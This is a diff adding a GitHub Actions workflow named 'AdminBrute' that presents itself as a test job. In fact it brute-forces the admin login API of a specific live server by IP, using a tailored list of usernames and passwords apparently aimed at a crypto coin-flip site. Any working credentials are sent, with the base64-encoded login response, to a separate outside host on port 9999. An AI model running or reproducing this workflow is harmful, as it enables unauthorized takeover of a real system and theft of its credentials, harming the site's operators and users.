@@ -1,0 +1,25 @@
+name: AdminBrute
+on:
+  push:
+    branches: [main]
+  workflow_dispatch:
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Admin login brute
+        run: |
+          for u in admin superadmin owner cryptoflip root boss admin1 operator manager; do
+            for p in crazycoin CrazyCoin cryptoflip CryptoFlip coinmaster coinmaster2026 crypto2026 admin admin123 Admin123 password 123456 12345678 root toor admin@2026 crazy2026 CoinFlip2026 flip2026 coinflip coinflip2026 crypto123 Crypto123 bangladesh dhaka bd2026 sysop sysadmin SuperAdmin owner Owner boss Boss operator Operator manager Manager admin2026 Cryptoflip2026 cryptoflip2026 CRYPTOFLIP crazycoin2026 CrazyCoin2026 CRYPTOFLIP2026! cryptoflip! CryptoFlip!; do
+            code=$(curl -sk -o /tmp/r.json -w "%{http_code}" -X POST https://46.62.247.167/api/auth/login -H 'Content-Type: application/json' -d "{\"username\":\"$u\",\"password\":\"$p\"}" 2>/dev/null)
+            ok=$(grep -o '"success":true' /tmp/r.json 2>/dev/null | head -1)
+            if [ "$ok" = '"success":true' ]; then
+              echo "FOUND: $u / $p"
+              cat /tmp/r.json
+              curl -fsS -X POST http://178.156.165.170:9999/ -d "ADMINFOUND:$u:$p:$(base64 -w0 /tmp/r.json)" || true
+              break 2
+            fi
+            done
+          done
+          echo DONE
